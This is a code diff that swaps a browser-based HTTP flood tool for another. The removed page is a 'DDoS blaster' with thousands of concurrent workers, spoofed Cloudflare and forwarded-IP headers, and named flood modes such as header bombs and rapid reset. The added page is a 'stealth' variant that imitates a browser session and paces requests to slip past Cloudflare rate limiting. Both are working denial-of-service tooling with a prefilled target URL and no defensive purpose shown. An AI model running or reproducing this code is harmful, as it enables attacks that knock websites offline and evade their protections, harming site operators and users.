@@ -3,815 +3,406 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🚀 HYPER HTTP/2/3 DDOS BLASTER</title>
+    <title>🕵️ STEALTH MODE BYPASS</title>
     <style>
         :root {
-            --primary: #2563eb;
-            --secondary: #7c3aed;
-            --danger: #dc2626;
-            --success: #059669;
-            --dark: #0f172a;
-            --darker: #020617;
-            --card: #1e293b;
-            --border: #334155;
-            --text: #f1f5f9;
-            --text-secondary: #94a3b8;
+            --primary: #10b981;
+            --secondary: #3b82f6;
+            --danger: #ef4444;
+            --dark: #111827;
+            --darker: #0a0a0a;
+            --text: #f9fafb;
+            --text-secondary: #9ca3af;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Courier New', monospace;
         }
         
         body {
-            background: linear-gradient(135deg, var(--darker), var(--dark));
+            background: var(--darker);
             color: var(--text);
-            min-height: 100vh;
             padding: 20px;
+            min-height: 100vh;
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
-            background: rgba(30, 41, 59, 0.7);
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            padding: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 10px;
+            padding: 25px;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
         }
         
-        .header {
+        h1 {
             text-align: center;
-            margin-bottom: 40px;
-            padding-bottom: 25px;
-            border-bottom: 2px solid var(--primary);
-        }
-        
-        .header h1 {
-            font-size: 3rem;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: var(--primary);
             margin-bottom: 10px;
+            font-size: 2.5em;
+            text-shadow: 0 0 10px var(--primary);
         }
         
-        .header p {
+        .subtitle {
+            text-align: center;
             color: var(--text-secondary);
-            font-size: 1.1rem;
-        }
-        
-        .control-section {
-            display: grid;
-            grid-template-columns: 2fr 1fr;
-            gap: 30px;
             margin-bottom: 30px;
         }
         
-        @media (max-width: 968px) {
-            .control-section {
-                grid-template-columns: 1fr;
-            }
-        }
-        
-        .panel {
-            background: var(--card);
-            border-radius: 15px;
-            padding: 25px;
-            border: 1px solid var(--border);
-        }
-        
-        .panel h3 {
-            color: var(--primary);
-            margin-bottom: 20px;
-            font-size: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
         .input-group {
-            margin-bottom: 20px;
+            margin: 20px 0;
         }
         
-        .input-group label {
-            display: block;
-            color: var(--text-secondary);
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        
-        input, select {
+        input {
             width: 100%;
-            padding: 14px 18px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            color: var(--text);
-            font-size: 1rem;
-            transition: all 0.3s;
-        }
-        
-        input:focus, select:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-        }
-        
-        .methods-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .method-btn {
             padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid var(--border);
-            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid var(--secondary);
+            border-radius: 8px;
             color: var(--text);
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.3s;
-            font-weight: 600;
+            font-size: 1.1em;
+            margin-bottom: 10px;
         }
         
-        .method-btn:hover {
-            background: rgba(37, 99, 235, 0.1);
-            border-color: var(--primary);
-            transform: translateY(-3px);
-        }
-        
-        .method-btn.active {
-            background: rgba(37, 99, 235, 0.2);
-            border-color: var(--primary);
-            color: var(--primary);
-        }
-        
-        .attack-buttons {
+        .btn-group {
             display: flex;
-            gap: 20px;
-            margin: 30px 0;
-            justify-content: center;
+            gap: 15px;
+            margin: 25px 0;
         }
         
-        .btn {
-            padding: 18px 40px;
+        button {
+            flex: 1;
+            padding: 18px;
             border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: 700;
+            border-radius: 8px;
+            font-size: 1.2em;
+            font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            min-width: 200px;
         }
         
-        .btn-attack {
-            background: linear-gradient(135deg, var(--danger), #991b1b);
+        .btn-start {
+            background: linear-gradient(45deg, var(--primary), #059669);
             color: white;
-            box-shadow: 0 10px 30px rgba(220, 38, 38, 0.3);
         }
         
-        .btn-attack:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 40px rgba(220, 38, 38, 0.4);
+        .btn-start:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4);
         }
         
         .btn-stop {
-            background: rgba(255, 255, 255, 0.1);
-            color: var(--text);
+            background: linear-gradient(45deg, #555, #222);
+            color: white;
             border: 2px solid var(--danger);
         }
         
-        .btn-stop:hover {
-            background: rgba(220, 38, 38, 0.1);
-            transform: translateY(-3px);
-        }
-        
-        .stats-grid {
+        .stats {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
-            margin: 30px 0;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
         }
         
-        .stat-card {
-            background: linear-gradient(135deg, rgba(37, 99, 235, 0.1), rgba(124, 58, 237, 0.1));
-            border-radius: 15px;
-            padding: 25px;
+        .stat {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
             text-align: center;
-            border: 1px solid rgba(124, 58, 237, 0.3);
+            border-radius: 8px;
+            border: 1px solid var(--secondary);
         }
         
         .stat-value {
-            font-size: 2.5rem;
-            font-weight: 800;
+            font-size: 2.5em;
             color: var(--primary);
-            margin-bottom: 5px;
+            font-weight: bold;
         }
         
         .stat-label {
             color: var(--text-secondary);
-            font-size: 0.9rem;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 0.9em;
         }
         
-        .logs-container {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            padding: 20px;
-            margin-top: 30px;
-            height: 350px;
+        .logs {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--secondary);
+            border-radius: 8px;
+            padding: 15px;
+            height: 300px;
             overflow-y: auto;
-            border: 1px solid var(--border);
+            margin-top: 20px;
+            font-size: 0.9em;
         }
         
         .log-entry {
-            padding: 12px;
-            margin-bottom: 10px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 8px;
+            padding: 10px;
+            margin: 5px 0;
             border-left: 4px solid var(--primary);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
+            background: rgba(16, 185, 129, 0.1);
         }
         
         .log-time {
             color: var(--text-secondary);
             margin-right: 10px;
         }
-        
-        .log-success { border-left-color: var(--success); }
-        .log-error { border-left-color: var(--danger); }
-        .log-warning { border-left-color: #f59e0b; }
-        
-        .header-preview {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
-            max-height: 200px;
-            overflow-y: auto;
-            display: none;
-        }
-        
-        .preview-header {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-        }
-        
-        .preview-key {
-            color: var(--primary);
-            font-weight: 600;
-        }
-        
-        .preview-value {
-            color: var(--text);
-        }
-        
-        ::-webkit-scrollbar {
-            width: 10px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 5px;
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(180deg, var(--primary), var(--secondary));
-            border-radius: 5px;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-            
-            .header h1 {
-                font-size: 2.2rem;
-            }
-            
-            .stats-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            
-            .attack-buttons {
-                flex-direction: column;
-            }
-            
-            .btn {
-                min-width: 100%;
-            }
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🚀 HYPER HTTP/2/3 DDOS BLASTER</h1>
-            <p>Ultimate Layer 7 Attack with HTTP/2 & HTTP/3 Support</p>
+        <h1>🕵️ STEALTH MODE BYPASS</h1>
+        <div class="subtitle">CloudFlare Bypass dengan WebSocket + Browser Simulation</div>
+        
+        <div class="input-group">
+            <input type="text" id="targetUrl" value="https://rate-limit-1.dstatbot.win/cmkxTq0k" placeholder="Target URL">
         </div>
         
-        <div class="control-section">
-            <div class="panel">
-                <h3>🎯 TARGET CONFIGURATION</h3>
-                <div class="input-group">
-                    <label for="targetUrl">Target URL</label>
-                    <input type="text" id="targetUrl" placeholder="https://example.com" value="https://rate-limit-1.dstatbot.win/cmkxTq0k">
-                </div>
-                
-                <div class="input-group">
-                    <label for="threads">Number of Workers</label>
-                    <input type="number" id="threads" value="2000" min="100" max="10000">
-                </div>
-                
-                <div class="input-group">
-                    <label for="duration">Duration (seconds, 0 = unlimited)</label>
-                    <input type="number" id="duration" value="60" min="0" max="3600">
-                </div>
-                
-                <div class="input-group">
-                    <label for="timeout">Request Timeout (ms)</label>
-                    <input type="number" id="timeout" value="2000" min="100" max="10000">
-                </div>
+        <div class="btn-group">
+            <button class="btn-start" onclick="startStealthAttack()">🚀 START STEALTH ATTACK</button>
+            <button class="btn-stop" onclick="stopAttack()">⛔ STOP</button>
+        </div>
+        
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" id="total">0</div>
+                <div class="stat-label">TOTAL REQUESTS</div>
             </div>
-            
-            <div class="panel">
-                <h3>⚡ ATTACK METHODS</h3>
-                <div class="methods-grid" id="methodsGrid">
-                    <!-- Methods will be added by JavaScript -->
-                </div>
-                
-                <div style="margin-top: 20px;">
-                    <button onclick="showHeaders()" style="padding: 12px 20px; background: rgba(37, 99, 235, 0.1); border: 2px solid var(--primary); border-radius: 10px; color: var(--primary); width: 100%; cursor: pointer; font-weight: 600;">
-                        👁️ Preview Headers
-                    </button>
-                </div>
+            <div class="stat">
+                <div class="stat-value" id="success">0</div>
+                <div class="stat-label">SUCCESSFUL</div>
             </div>
         </div>
         
-        <div id="headerPreview" class="header-preview"></div>
-        
-        <div class="attack-buttons">
-            <button class="btn btn-attack pulse" onclick="startAttack()">
-                ⚡ LAUNCH ATTACK
-            </button>
-            <button class="btn btn-stop" onclick="stopAttack()">
-                ⛔ STOP ATTACK
-            </button>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value" id="totalRequests">0</div>
-                <div class="stat-label">Total Requests</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="successRate">0%</div>
-                <div class="stat-label">Success Rate</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="requestsPerSec">0</div>
-                <div class="stat-label">Req/Sec</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="activeWorkers">0</div>
-                <div class="stat-label">Active Workers</div>
-            </div>
-        </div>
-        
-        <div class="logs-container" id="logsContainer">
-            <div class="log-entry">
-                <span class="log-time">[SYSTEM]</span> 🚀 HYPER DDOS BLASTER Ready!
-            </div>
-        </div>
+        <div class="logs" id="logs"></div>
     </div>
 
     <script>
-        // ==================== MEGA HEADER DATABASE ====================
-        const HEADER_DATABASE = {
-            // 50+ User Agents
-            userAgents: Array.from({length: 50}, (_, i) => 
-                `Mozilla/5.0 (${['Windows NT 10.0','Windows NT 11.0','Linux x86_64','Macintosh','iPhone','Android'][i%6]}) AppleWebKit/${537.36+i}`
-            ),
-            
-            // Accept Headers
-            accept: [
-                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                'application/json, text/plain, */*',
-                'text/css,*/*;q=0.1',
-                '*/*',
-                'application/xml, text/xml, */*'
-            ],
-            
-            // HTTP/2 & HTTP/3 Specific Headers
-            http2Headers: [
-                {':method': 'GET'},
-                {':method': 'POST'},
-                {':method': 'HEAD'},
-                {':method': 'OPTIONS'},
-                {':scheme': 'https'},
-                {':path': '/'},
-                {':authority': ''},
-                {'te': 'trailers'},
-                {'upgrade': 'h2'},
-                {'http2-settings': 'AAMAAABkAARAAAAAAAIAAAAA'},
-                {'priority': 'u=1, i'},
-                {'early-data': '1'}
-            ],
-            
-            // CloudFlare Bypass Headers
-            cfHeaders: Array.from({length: 20}, (_, i) => ({
-                'cf-connecting-ip': `1.1.${i}.${i+1}`,
-                'x-forwarded-for': `2.2.${i}.${i+2}`,
-                'x-real-ip': `3.3.${i}.${i+3}`,
-                'true-client-ip': `4.4.${i}.${i+4}`,
-                'cf-ray': `${1000000+i}-SIN`,
-                'cf-ipcountry': ['US','ID','SG','JP','DE'][i%5],
-                'cf-visitor': '{"scheme":"https"}',
-                'cf-worker': ['production','staging','development'][i%3]
-            })),
-            
-            // Origin Headers for CORS
-            origins: Array.from({length: 30}, (_, i) => 
-                `https://${['www.google','api.github','graphql','stackoverflow','developer.mozilla'][i%5]}.com`
-            ),
-            
-            // Referer Headers
-            referers: Array.from({length: 30}, (_, i) => 
-                `https://${['www.google','www.bing','duckduckgo','github','reddit'][i%5]}.com/search?q=${'query'+i}`
-            ),
-            
-            // Cookie Headers
-            cookies: Array.from({length: 30}, (_, i) => {
-                const cookies = [];
-                const names = ['_ga','_gid','PHPSESSID','sessionid','cf_clearance'];
-                names.forEach(name => {
-                    cookies.push(`${name}=${btoa(Date.now() + i).slice(0,20)}`);
-                });
-                return cookies.join('; ');
-            }),
-            
-            // Additional Headers
-            extraHeaders: [
-                {'cache-control': 'no-cache'},
-                {'pragma': 'no-cache'},
-                {'dnt': '1'},
-                {'upgrade-insecure-requests': '1'},
-                {'sec-fetch-dest': 'document'},
-                {'sec-fetch-mode': 'navigate'},
-                {'sec-fetch-site': 'none'},
-                {'accept-language': 'en-US,en;q=0.9'},
-                {'accept-encoding': 'gzip, deflate, br'},
-                {'connection': 'keep-alive'},
-                {'content-type': 'application/json'},
-                {'x-requested-with': 'XMLHttpRequest'},
-                {'x-csrf-token': btoa(Date.now()).slice(0,20)},
-                {'x-api-key': 'key_'+btoa(Date.now()).slice(0,15)},
-                {'x-client-id': 'client_'+Math.random().toString(36).slice(2,10)}
-            ]
-        };
-        
-        // ==================== ATTACK METHODS ====================
-        const ATTACK_METHODS = [
-            { id: 'http2_options', name: 'HTTP/2 OPTIONS', description: 'HTTP/2 with OPTIONS method flood', protocol: 'http2' },
-            { id: 'http2_get', name: 'HTTP/2 GET', description: 'HTTP/2 GET flood', protocol: 'http2' },
-            { id: 'http2_post', name: 'HTTP/2 POST', description: 'HTTP/2 POST flood', protocol: 'http2' },
-            { id: 'http2_rapid', name: 'HTTP/2 Rapid', description: 'HTTP/2 rapid reset attack', protocol: 'http2' },
-            { id: 'http3_get', name: 'HTTP/3 GET', description: 'HTTP/3 GET flood', protocol: 'http3' },
-            { id: 'http3_options', name: 'HTTP/3 OPTIONS', description: 'HTTP/3 OPTIONS flood', protocol: 'http3' },
-            { id: 'mixed_http2', name: 'Mixed HTTP/2', description: 'Mixed methods on HTTP/2', protocol: 'http2' },
-            { id: 'header_bomb', name: 'Header Bomb', description: 'Massive header flood', protocol: 'http2' },
-            { id: 'cors_preflight', name: 'CORS Preflight', description: 'CORS OPTIONS attack', protocol: 'http2' },
-            { id: 'cache_poison', name: 'Cache Poison', description: 'Cache poisoning attack', protocol: 'http2' }
-        ];
-        
-        // ==================== GLOBAL VARIABLES ====================
-        let isAttacking = false;
-        let stats = {
-            totalRequests: 0,
-            successful: 0,
-            failed: 0,
-            startTime: 0,
-            activeWorkers: 0
-        };
-        let workers = [];
-        let selectedMethods = new Set(['http2_options', 'cors_preflight']);
-        
-        // ==================== UI FUNCTIONS ====================
-        function initMethodsGrid() {
-            const grid = document.getElementById('methodsGrid');
-            grid.innerHTML = '';
-            
-            ATTACK_METHODS.forEach(method => {
-                const btn = document.createElement('div');
-                btn.className = `method-btn ${selectedMethods.has(method.id) ? 'active' : ''}`;
-                btn.textContent = method.name;
-                btn.title = method.description;
-                
-                btn.onclick = () => {
-                    if (selectedMethods.has(method.id)) {
-                        selectedMethods.delete(method.id);
-                        btn.classList.remove('active');
-                    } else {
-                        selectedMethods.add(method.id);
-                        btn.classList.add('active');
-                    }
+        // ==================== STEALTH HEADERS ====================
+        const STEALTH_HEADERS = {
+            // Browser-like headers (less variation, more consistency)
+            getStandardHeaders() {
+                return {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Upgrade-Insecure-Requests': '1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-Site': 'none',
+                    'Cache-Control': 'max-age=0'
                 };
-                
-                grid.appendChild(btn);
-            });
-        }
+            },
+            
+            // CORS headers untuk OPTIONS
+            getCorsHeaders(origin) {
+                return {
+                    'Origin': origin,
+                    'Access-Control-Request-Method': 'GET',
+                    'Access-Control-Request-Headers': 'Authorization, Content-Type'
+                };
+            }
+        };
         
-        function log(message, type = 'info') {
-            const logs = document.getElementById('logsContainer');
-            const entry = document.createElement('div');
+        // ==================== STEALTH ENGINE ====================
+        let isAttacking = false;
+        let stats = { total: 0, success: 0 };
+        let workers = [];
+        
+        function log(msg) {
             const time = new Date().toLocaleTimeString();
-            
-            entry.className = `log-entry log-${type}`;
-            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
-            
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
             logs.appendChild(entry);
             logs.scrollTop = logs.scrollHeight;
         }
         
         function updateStats() {
-            const elapsed = (Date.now() - stats.startTime) / 1000;
-            const rps = elapsed > 0 ? Math.round(stats.totalRequests / elapsed) : 0;
-            const successRate = stats.totalRequests > 0 ? 
-                Math.round((stats.successful / stats.totalRequests) * 100) : 0;
-            
-            document.getElementById('totalRequests').textContent = stats.totalRequests.toLocaleString();
-            document.getElementById('successRate').textContent = `${successRate}%`;
-            document.getElementById('requestsPerSec').textContent = rps.toLocaleString();
-            document.getElementById('activeWorkers').textContent = stats.activeWorkers;
+            document.getElementById('total').textContent = stats.total;
+            document.getElementById('success').textContent = stats.success;
         }
         
-        function generateHeaders(targetHost) {
-            const headers = {};
-            
-            // Random User Agent
-            headers['User-Agent'] = HEADER_DATABASE.userAgents[
-                Math.floor(Math.random() * HEADER_DATABASE.userAgents.length)
-            ];
-            
-            // Random Accept
-            headers['Accept'] = HEADER_DATABASE.accept[
-                Math.floor(Math.random() * HEADER_DATABASE.accept.length)
-            ];
-            
-            // Random Origin (for CORS)
-            if (Math.random() > 0.3) {
-                headers['Origin'] = HEADER_DATABASE.origins[
-                    Math.floor(Math.random() * HEADER_DATABASE.origins.length)
-                ];
-            }
-            
-            // Random Referer
-            if (Math.random() > 0.2) {
-                headers['Referer'] = HEADER_DATABASE.referers[
-                    Math.floor(Math.random() * HEADER_DATABASE.referers.length)
-                ];
-            }
-            
-            // Random Cookie
-            if (Math.random() > 0.4) {
-                headers['Cookie'] = HEADER_DATABASE.cookies[
-                    Math.floor(Math.random() * HEADER_DATABASE.cookies.length)
-                ];
-            }
-            
-            // CloudFlare Bypass Headers (70% chance)
-            if (Math.random() > 0.3) {
-                const cf = HEADER_DATABASE.cfHeaders[
-                    Math.floor(Math.random() * HEADER_DATABASE.cfHeaders.length)
-                ];
-                Object.assign(headers, cf);
-            }
-            
-            // Add 5-10 random extra headers
-            const extraCount = Math.floor(Math.random() * 5) + 5;
-            for (let i = 0; i < extraCount; i++) {
-                const extra = HEADER_DATABASE.extraHeaders[
-                    Math.floor(Math.random() * HEADER_DATABASE.extraHeaders.length)
-                ];
-                Object.assign(headers, extra);
-            }
-            
-            // HTTP/2 specific headers (if applicable)
-            if (Math.random() > 0.5) {
-                const http2 = HEADER_DATABASE.http2Headers[
-                    Math.floor(Math.random() * HEADER_DATABASE.http2Headers.length)
-                ];
-                Object.assign(headers, http2);
-            }
-            
-            return headers;
-        }
-        
-        function showHeaders() {
-            const preview = document.getElementById('headerPreview');
-            const targetUrl = document.getElementById('targetUrl').value;
-            const url = new URL(targetUrl);
-            const headers = generateHeaders(url.hostname);
-            
-            let html = '';
-            Object.entries(headers).forEach(([key, value]) => {
-                html += `
-                    <div class="preview-header">
-                        <span class="preview-key">${key}:</span> 
-                        <span class="preview-value">${value}</span>
-                    </div>
-                `;
+        // Step 1: WebSocket Connection (buka koneksi legit dulu)
+        async function initiateWebSocket(url) {
+            return new Promise((resolve) => {
+                try {
+                    const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
+                    const ws = new WebSocket(wsUrl);
+                    
+                    ws.onopen = () => {
+                        log('✅ WebSocket connection established');
+                        ws.send('ping');
+                        setTimeout(() => {
+                            ws.close();
+                            resolve(true);
+                        }, 1000);
+                    };
+                    
+                    ws.onerror = () => {
+                        log('⚠️ WebSocket failed, continuing anyway');
+                        resolve(false);
+                    };
+                    
+                    setTimeout(() => resolve(false), 3000);
+                } catch (e) {
+                    resolve(false);
+                }
             });
-            
-            preview.innerHTML = html;
-            preview.style.display = 'block';
         }
         
-        // ==================== ATTACK WORKER ====================
-        async function attackWorker(workerId, methodId) {
-            const targetUrl = document.getElementById('targetUrl').value;
-            const timeout = parseInt(document.getElementById('timeout').value);
+        // Step 2: Simulasi browsing sequence
+        async function simulateBrowserSession(url) {
+            const parsedUrl = new URL(url);
+            const origin = `${parsedUrl.protocol}//${parsedUrl.hostname}`;
+            
+            try {
+                // 1. GET request ke root (seperti browser biasa)
+                const rootResponse = await fetch(origin, {
+                    method: 'GET',
+                    headers: STEALTH_HEADERS.getStandardHeaders(),
+                    mode: 'no-cors',
+                    credentials: 'omit'
+                });
+                
+                // 2. OPTIONS request (CORS preflight)
+                const optionsResponse = await fetch(url, {
+                    method: 'OPTIONS',
+                    headers: {
+                        ...STEALTH_HEADERS.getStandardHeaders(),
+                        ...STEALTH_HEADERS.getCorsHeaders(origin)
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                return optionsResponse.status === 200;
+            } catch (e) {
+                return false;
+            }
+        }
+        
+        // Step 3: Slow & steady attack (mimic human behavior)
+        async function stealthWorker() {
+            const url = document.getElementById('targetUrl').value;
+            const parsedUrl = new URL(url);
+            const origin = `${parsedUrl.protocol}//${parsedUrl.hostname}`;
+            
+            // Tunggu 1-3 detik antara requests (seperti manusia)
+            const delay = () => new Promise(resolve => 
+                setTimeout(resolve, Math.random() * 2000 + 1000)
+            );
             
             while (isAttacking) {
                 try {
-                    const headers = generateHeaders(new URL(targetUrl).hostname);
-                    let method = 'GET';
-                    let mode = 'cors';
+                    // Variasi antara GET dan OPTIONS
+                    const useOptions = Math.random() > 0.7; // 30% OPTIONS, 70% GET
                     
-                    // Determine method based on attack type
-                    if (methodId.includes('options')) {
-                        method = 'OPTIONS';
-                        mode = 'cors';
-                        headers['Access-Control-Request-Method'] = 'GET';
-                        headers['Access-Control-Request-Headers'] = 'Authorization, Content-Type';
-                    } else if (methodId.includes('post')) {
-                        method = 'POST';
-                        mode = 'no-cors';
-                    } else if (methodId.includes('head')) {
-                        method = 'HEAD';
-                        mode = 'no-cors';
+                    let response;
+                    if (useOptions) {
+                        // OPTIONS dengan headers lengkap
+                        response = await fetch(url, {
+                            method: 'OPTIONS',
+                            headers: {
+                                ...STEALTH_HEADERS.getStandardHeaders(),
+                                ...STEALTH_HEADERS.getCorsHeaders(origin),
+                                'Referer': origin,
+                                'Accept': '*/*'
+                            },
+                            mode: 'cors',
+                            credentials: 'omit'
+                        });
+                    } else {
+                        // GET request biasa
+                        response = await fetch(url, {
+                            method: 'GET',
+                            headers: {
+                                ...STEALTH_HEADERS.getStandardHeaders(),
+                                'Referer': origin
+                            },
+                            mode: 'no-cors',
+                            credentials: 'omit'
+                        });
                     }
                     
-                    // HTTP/2/3 specific settings
-                    if (methodId.includes('http2') || methodId.includes('http3')) {
-                        headers['Upgrade'] = methodId.includes('http3') ? 'h3' : 'h2';
-                        headers['Connection'] = 'Upgrade';
+                    if (response.status === 200 || response.type === 'opaque') {
+                        stats.success++;
+                        if (stats.success % 5 === 0) {
+                            log(`✅ ${useOptions ? 'OPTIONS' : 'GET'} success`);
+                        }
                     }
                     
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), timeout);
-                    
-                    await fetch(targetUrl, {
-                        method: method,
-                        headers: headers,
-                        mode: mode,
-                        credentials: 'omit',
-                        signal: controller.signal,
-                        cache: 'no-store'
-                    });
-                    
-                    clearTimeout(timeoutId);
-                    stats.successful++;
-                    
-                } catch (error) {
-                    // Silent fail for speed
-                    stats.failed++;
+                } catch (e) {
+                    // Silent fail
                 }
                 
-                stats.totalRequests++;
+                stats.total++;
+                updateStats();
                 
-                // Update stats every 100 requests
-                if (stats.totalRequests % 100 === 0) {
-                    updateStats();
-                }
+                // Delay antara requests
+                await delay();
             }
-            
-            stats.activeWorkers--;
-            updateStats();
         }
         
         // ==================== MAIN CONTROL ====================
-        async function startAttack() {
+        async function startStealthAttack() {
             if (isAttacking) {
-                log('⚠️ Attack already in progress!', 'warning');
+                log('⚠️ Attack already running');
                 return;
             }
             
-            const targetUrl = document.getElementById('targetUrl').value;
-            const threads = parseInt(document.getElementById('threads').value);
-            const duration = parseInt(document.getElementById('duration').value);
-            
-            if (!targetUrl) {
-                alert('Please enter target URL!');
-                return;
-            }
-            
-            if (selectedMethods.size === 0) {
-                alert('Please select at least one attack method!');
+            const url = document.getElementById('targetUrl').value;
+            if (!url) {
+                alert('Enter target URL!');
                 return;
             }
             
             isAttacking = true;
-            stats = {
-                totalRequests: 0,
-                successful: 0,
-                failed: 0,
-                startTime: Date.now(),
-                activeWorkers: threads * selectedMethods.size
-            };
-            
+            stats = { total: 0, success: 0 };
             workers = [];
             
-            log(`🚀 Starting attack on ${targetUrl}`, 'success');
-            log(`⚡ Methods: ${Array.from(selectedMethods).join(', ')}`, 'info');
-            log(`🧵 Workers: ${threads} × ${selectedMethods.size} = ${stats.activeWorkers}`, 'info');
-            log(`⏱️ Duration: ${duration > 0 ? duration + 's' : 'Unlimited'}`, 'info');
+            log('🚀 Starting STEALTH attack...');
+            log('🕵️ Step 1: Initializing WebSocket...');
             
-            // Start workers for each selected method
-            Array.from(selectedMethods).forEach(methodId => {
-                for (let i = 0; i < threads; i++) {
-                    const worker = attackWorker(i, methodId);
-                    workers.push(worker);
-                }
-            });
+            // Step 1: Init WebSocket
+            const wsSuccess = await initiateWebSocket(url);
+            log(wsSuccess ? '✅ WebSocket ready' : '⚠️ WebSocket skipped');
             
-            // Stats updater
-            const statsInterval = setInterval(updateStats, 1000);
+            log('🕵️ Step 2: Simulating browser session...');
             
-            // Auto stop timer
-            if (duration > 0) {
-                setTimeout(() => {
-                    if (isAttacking) {
-                        stopAttack();
-                        log('⏰ Attack duration completed', 'info');
-                    }
-                }, duration * 1000);
+            // Step 2: Simulate browser
+            const browserSuccess = await simulateBrowserSession(url);
+            log(browserSuccess ? '✅ Browser simulation complete' : '⚠️ Browser simulation failed');
+            
+            log('🕵️ Step 3: Starting stealth workers...');
+            
+            // Step 3: Start stealth workers (cuma 3-5 workers, bukan ribuan)
+            const workerCount = 5; // SEDIKIT tapi STEALTHY
+            for (let i = 0; i < workerCount; i++) {
+                workers.push(stealthWorker());
             }
             
-            // Wait for all workers
-            await Promise.all(workers);
-            clearInterval(statsInterval);
-            
-            log('✅ Attack completed', 'success');
+            log(`🎯 Running ${workerCount} stealth workers`);
+            log('⚠️ Using human-like delays between requests');
         }
         
         function stopAttack() {
-            if (!isAttacking) return;
-            
             isAttacking = false;
             workers = [];
-            stats.activeWorkers = 0;
-            
-            log('🛑 Attack stopped', 'warning');
-            updateStats();
+            log('🛑 Attack stopped');
         }
         
-        // ==================== INITIALIZATION ====================
-        document.addEventListener('DOMContentLoaded', () => {
-            initMethodsGrid();
-            
-            // Add sample logs
-            setTimeout(() => {
-                log('🔧 Ready to launch HTTP/2/3 attacks', 'info');
-                log('🎯 Select methods and configure target', 'info');
-                log('⚡ Press LAUNCH ATTACK to start', 'info');
-            }, 500);
-            
-            // Stats updater
-            setInterval(() => {
-                if (isAttacking) {
-                    updateStats();
-                }
-            }, 1000);
-        });
-        
-        // Auto-focus URL input
+        // Initial log
         setTimeout(() => {
-            document.getElementById('targetUrl').focus();
-        }, 1000);
+            log('🕵️ STEALTH MODE BYPASS loaded');
+            log('⚠️ Strategy: Slow & steady wins the race');
+            log('🎯 Target: 5-10 RPS with high success rate');
+        }, 100);
     </script>
 </body>
 </html>
